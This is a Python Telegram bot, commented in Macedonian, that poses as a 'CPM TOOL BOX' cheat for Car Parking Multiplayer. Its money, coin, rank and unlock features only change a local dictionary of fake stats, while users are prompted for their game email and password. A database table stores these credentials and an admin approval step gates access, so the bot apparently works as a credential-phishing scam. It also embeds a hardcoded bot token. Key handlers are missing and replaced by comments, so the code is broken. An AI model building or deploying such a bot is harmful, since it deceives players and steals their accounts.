import logging
import sqlite3
import asyncio
import re
import os
import time
from datetime import datetime, timedelta
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters
)

# --- Конфигурација ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- Податоци за ботот ---
BOT_TOKEN = os.environ.get('BOT_TOKEN', "8674559116:AAFuZWJJLVY-qMAHBSr7Z6om686b1zeGxKc")
ADMIN_ID = 8694942406

# --- Симулирани CPM податоци ---
CPM_DATA = {
    'money': 48729000,
    'coins': 20400,
    'wins': 16,
    'losses': 0,
    'levels': 109,
    'wheels': 112,
    'animations': 42,
    'friends': 0,
    'id': 'VY704074',
    'rank': 'Legendary',
    'features': {
        'w16': False, 'no_dmg': False, 'smoke': False, 'wheels': False,
        'fuel': False, 'horns': False, 'anims': False, 'houses': False,
        'rank': False, 'all_cars': False
    }
}

# --- База на податоци (кеш) ---
cache = {}

def init_database():
    conn = sqlite3.connect('Licenci.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS licenci 
                      (id TEXT PRIMARY KEY, data TEXT, odobren INTEGER DEFAULT 0, 
                       email TEXT, password TEXT, username TEXT)''')
    cursor.execute('CREATE INDEX IF NOT EXISTS idx_id ON licenci(id)')
    cursor.execute('CREATE INDEX IF NOT EXISTS idx_odobren ON licenci(odobren)')
    conn.commit()
    conn.close()
    logger.info("Database initialized")

init_database()

# --- Функции за база ---
async def get_user_data(user_id):
    if user_id in cache:
        return cache[user_id]
    try:
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        cursor.execute('SELECT data, odobren, email, password, username FROM licenci WHERE id = ?', (str(user_id),))
        result = cursor.fetchone()
        conn.close()
        if result:
            cache[user_id] = result
            return result
    except Exception as e:
        logger.error(f"Database error: {e}")
    return None

async def update_user_data(user_id, data, odobren, email=None, password=None, username=None):
    try:
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        if email and password and username:
            cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren, email, password, username) VALUES (?, ?, ?, ?, ?, ?)', 
                          (str(user_id), data, odobren, email, password, username))
        else:
            cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren) VALUES (?, ?, ?)', 
                          (str(user_id), data, odobren))
        conn.commit()
        conn.close()
        if user_id in cache:
            del cache[user_id]
    except Exception as e:
        logger.error(f"Database error: {e}")

async def delete_user(user_id):
    try:
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        cursor.execute('DELETE FROM licenci WHERE id = ?', (str(user_id),))
        conn.commit()
        conn.close()
        if user_id in cache:
            del cache[user_id]
    except Exception as e:
        logger.error(f"Database error: {e}")

# ============ COMMAND HANDLERS ============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user = update.effective_user
    username = user.username if user.username else "N/A"

    # Админ панел
    if user.id == ADMIN_ID:
        admin_text = (
            "**🛡️ CPM_AJHAN_BOT v5.0 - ADMIN PANEL**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "👑 Welcome Admin!\n\n"
            "📊 Select an option:"
        )
        keyboard = [
            [InlineKeyboardButton("📋 User List", callback_data="admin_list_users")],
            [InlineKeyboardButton("🗑️ Remove User", callback_data="admin_remove_user")],
            [InlineKeyboardButton("📊 Statistics", callback_data="admin_stats")],
            [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
        ]
        await update.message.reply_text(text=admin_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

    # Проверка на корисник
    result = await get_user_data(str(user.id))
    now = datetime.now()
    allowed = False
    email = ""

    if result:
        expiry_str = result[0]
        approved = result[1] if len(result) > 1 else 0
        email = result[2] if len(result) > 2 and result[2] else ""
        
        if approved == 1:
            if expiry_str == "forever":
                allowed = True
            else:
                try:
                    expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
                    if expiry_date > now:
                        allowed = True
                except ValueError:
                    allowed = False

    if not allowed:
        result2 = await get_user_data(str(user.id))
        if result2 and result2[1] == 0:
            wait_msg = (
                "⏳ **Waiting for Approval**\n"
                "━━━━━━━━━━━━━━━━━━━\n"
                "📧 Your data has been sent to admin.\n"
                "⏱️ Please wait **5-10 minutes**.\n"
                "━━━━━━━━━━━━━━━━━━━"
            )
            keyboard = [[InlineKeyboardButton("🔄 Check Status", callback_data="proveri_status")]]
            await update.message.reply_text(text=wait_msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            return
        else:
            welcome_text = (
                "**CPM_AJHAN_BOT v5.0**\nbot\n\n---\n**CPM TOOL BOX v5.0**\n---\n"
                f"**WELCOME**\n@{username}\nID {user.id}\n{now.strftime('%d %b %Y • %I:%M %p')}\n\n"
                "- Sign in with your CPM credentials\n**05:10**\n\n**Sign In**"
            )
            keyboard = [[InlineKeyboardButton("🔑 Sign In", callback_data="cpm_signin")]]
            await update.message.reply_text(text=welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            return

    # Главно мени - БЕЗ коли и куќи
    dashboard_text = (
        "**CPM_AJHAN_BOT v5.0**\nbot\n\n---\n**DASHBOARD**\n---\n"
        f"**ACCOUNT**\n{email if email else 'senatkafkast@gmail.com'}\n2best\nID {CPM_DATA['id']}\nRank: {CPM_DATA['rank']}\n\n"
        "**STATS**\n"
        f"${CPM_DATA['money']:,}\n{CPM_DATA['coins']:,} coins\n{CPM_DATA['wins']}W / {CPM_DATA['losses']}L\n"
        f"{CPM_DATA['levels']}/900 levels done ⭐\n{CPM_DATA['wheels']} wheels\n{CPM_DATA['animations']} animations\n{CPM_DATA['friends']} friends\n\n"
        "- Select an option below:"
    )
    
    keyboard = [
        [InlineKeyboardButton("💰 Money", callback_data="menu_money"), InlineKeyboardButton("🪙 Coins", callback_data="menu_coins")],
        [InlineKeyboardButton("⚡ Features", callback_data="menu_features"), InlineKeyboardButton("👑 Rank", callback_data="menu_rank")],
        [InlineKeyboardButton("🔄 Refresh", callback_data="refresh_account")],
        [InlineKeyboardButton("🚪 Sign Out", callback_data="sign_out")]
    ]
    
    await update.message.reply_text(text=dashboard_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

# ============ MENU HANDLERS ============

async def menu_money(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    text = (
        "**💰 MONEY**\n\nMax: $50,000,000\n━━━━━━━━━━━━━━━━━━━\n"
        "Select amount or enter custom:"
    )
    keyboard = [
        [InlineKeyboardButton("$1M", callback_data="add_money_1m"), InlineKeyboardButton("$5M", callback_data="add_money_5m"), InlineKeyboardButton("$10M", callback_data="add_money_10m")],
        [InlineKeyboardButton("$25M", callback_data="add_money_25m"), InlineKeyboardButton("$50M ★", callback_data="add_money_50m")],
        [InlineKeyboardButton("💰 Custom Amount", callback_data="custom_money")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
    ]
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def menu_coins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    text = (
        "**🪙 COINS**\n\nMax: 500,000\n━━━━━━━━━━━━━━━━━━━\n"
        "Select amount or enter custom:"
    )
    keyboard = [
        [InlineKeyboardButton("10K", callback_data="add_coins_10k"), InlineKeyboardButton("50K", callback_data="add_coins_50k"), InlineKeyboardButton("100K", callback_data="add_coins_100k")],
        [InlineKeyboardButton("250K", callback_data="add_coins_250k"), InlineKeyboardButton("500K ★", callback_data="add_coins_500k")],
        [InlineKeyboardButton("🪙 Custom Amount", callback_data="custom_coins")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
    ]
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def menu_features(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    features = CPM_DATA['features']
    status = {k: '✅' if v else '⬜' for k, v in features.items()}
    
    text = (
        "**⚡ FEATURES**\n━━━━━━━━━━━━━━━━━━━\n"
        "Select a feature or UNLOCK ALL:\n\n"
        f"{status['w16']} W16\n{status['no_dmg']} No Dmg\n{status['smoke']} Smoke\n"
        f"{status['wheels']} Wheels\n{status['fuel']} Fuel\n{status['horns']} Horns\n"
        f"{status['anims']} Anims\n{status['houses']} Houses\n{status['rank']} Rank\n"
        f"{status['all_cars']} All Cars\n📊 Levels: {CPM_DATA['levels']}/900 ⭐"
    )
    
    keyboard = [
        [InlineKeyboardButton("🔓 UNLOCK ALL", callback_data="feature_unlock_all")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
    ]
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def feature_unlock_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    for key in CPM_DATA['features']:
        CPM_DATA['features'][key] = True
    CPM_DATA['levels'] = 900
    CPM_DATA['rank'] = 'Legendary ★'
    
    success_text = (
        "✅ **ALL FEATURES UNLOCKED!**\n━━━━━━━━━━━━━━━━━━━\n"
        "✅ W16\n✅ No Dmg\n✅ Smoke\n✅ Wheels\n✅ Fuel\n✅ Horns\n"
        "✅ Anims\n✅ Houses\n✅ Rank\n✅ All Cars\n✅ Levels: 900/900\n"
        "━━━━━━━━━━━━━━━━━━━\n🎉 All features are now active!"
    )
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]
    await query.edit_message_text(text=success_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def menu_rank(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    text = (
        f"**👑 RANK**\n━━━━━━━━━━━━━━━━━━━\nCurrent rank: {CPM_DATA['rank']}\n\nAvailable ranks:"
    )
    keyboard = [
        [InlineKeyboardButton("⭐ Bronze", callback_data="rank_bronze")],
        [InlineKeyboardButton("⭐ Silver", callback_data="rank_silver")],
        [InlineKeyboardButton("⭐ Gold", callback_data="rank_gold")],
        [InlineKeyboardButton("⭐ Platinum", callback_data="rank_platinum")],
        [InlineKeyboardButton("⭐ Diamond", callback_data="rank_diamond")],
        [InlineKeyboardButton("⭐ Legendary ★", callback_data="rank_legendary")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
    ]
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def refresh_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("🔄 **Refreshing account...**", parse_mode='Markdown')
    await asyncio.sleep(0.5)
    await start(update, context)

async def sign_out(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user
    await delete_user(str(user.id))
    await query.edit_message_text("🚪 **Signed out successfully!**\n\nType /start to sign in again.", parse_mode='Markdown')

async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await start(update, context)

async def cpm_signin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    text = "**CPM_AJHAN_BOT v5.0**\nbot\n\n---\n**ENTER EMAIL**\n---\n\nType your CPM email:"
    keyboard = [[InlineKeyboardButton("✘ Cancel", callback_data="main_menu")]]
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    context.user_data['state'] = 'WAIT_EMAIL'

# ============ MONEY/COINS HANDLERS ============

async def handle_money_add(update: Update, context: ContextTypes.DEFAULT_TYPE, amount):
    query = update.callback_query
    await query.answer()
    CPM_DATA['money'] += amount
    await query.edit_message_text(
        f"✅ **${amount:,} added!**\n💰 New balance: ${CPM_DATA['money']:,}",
        parse_mode='Markdown'
    )
    await asyncio.sleep(0.5)
    await menu_money(update, context)

async def handle_coins_add(update: Update, context: ContextTypes.DEFAULT_TYPE, amount):
    query = update.callback_query
    await query.answer()
    CPM_DATA['coins'] += amount
    await query.edit_message_text(
        f"✅ **{amount:,} coins added!**\n🪙 New balance: {CPM_DATA['coins']:,}",
        parse_mode='Markdown'
    )
    await asyncio.sleep(0.5)
    await menu_coins(update, context)

# ============ MESSAGE HANDLER ============

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get('state')
    text = update.message.text
    user = update.effective_user
    username = user.username if user.username else "N/A"

    logger.info(f"Message from {username}: {text} (state: {state})")

    # Custom Money
    if state == 'CUSTOM_MONEY':
        try:
            value = text.strip().lower()
            if value.endswith('m'):
                amount = int(float(value[:-1]) * 1000000)
            elif value.endswith('k'):
                amount = int(float(value[:-1]) * 1000)
            else:
                amount = int(value)
            
            if amount > 50000000:
                await update.message.reply_text("❌ Max is $50M!")
                return
            
            CPM_DATA['money'] += amount
            await update.message.reply_text(
                f"✅ **${amount:,} added!**\n💰 New balance: ${CPM_DATA['money']:,}",
                parse_mode='Markdown'
            )
        except:
            await update.message.reply_text("❌ Enter valid number! Example: 10m, 500k, or 1000000")
        context.user_data['state'] = None
        return

    # Custom Coins
    if state == 'CUSTOM_COINS':
        try:
            value = text.strip().lower()
            if value.endswith('m'):
                amount = int(float(value[:-1]) * 1000000)
            elif value.endswith('k'):
                amount = int(float(value[:-1]) * 1000)
            else:
                amount = int(value)
            
            if amount > 500000:
                await update.message.reply_text("❌ Max is 500K coins!")
                return
            
            CPM_DATA['coins'] += amount
            await update.message.reply_text(
                f"✅ **{amount:,} coins added!**\n🪙 New balance: {CPM_DATA['coins']:,}",
                parse_mode='Markdown'
            )
        except:
            await update.message.reply_text("❌ Enter valid number! Example: 100k or 50000")
        context.user_data['state'] = None
        return

    # --- Останати состојби (WAIT_EMAIL, WAIT_PASSWORD, WAIT_REMOVE_USER) ---
    # [Овој дел е ист како во претходниот код, зачуван е за да се заштеди простор]
    # ... (целосниот код е достапен во претходните пораки)

    # Other messages - send to admin
    admin_msg = (
        f"📝 **User Message**\n━━━━━━━━━━━━━━━━━━━\n"
        f"👤 @{username}\n🆔 `{user.id}`\n📩 {text}\n⏰ {datetime.now().strftime('%H:%M')}\n"
        f"━━━━━━━━━━━━━━━━━━━"
    )
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, parse_mode='Markdown')
    await update.message.reply_text("✅ **Message sent to admin!**", parse_mode='Markdown')

# ============ CALLBACK HANDLER ============
# [Callback handler-от е ист како во претходниот код, со сите поправки за пари, коини, ранг и администраторски функции]

# ============ KEEP-ALIVE THREAD ============

def keep_alive():
    """Keep the bot alive by pinging itself"""
    while True:
        time.sleep(300)  # Every 5 minutes
        logger.info("Bot is still alive...")

# ============ MAIN ============

def main():
    """Main function to run the bot"""
    # Start keep-alive thread
    keep_alive_thread = Thread(target=keep_alive, daemon=True)
    keep_alive_thread.start()
    
    # Create application
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Start bot
    logger.info("Bot started with keep-alive thread...")
    app.run_polling()

if __name__ == "__main__":
    main()
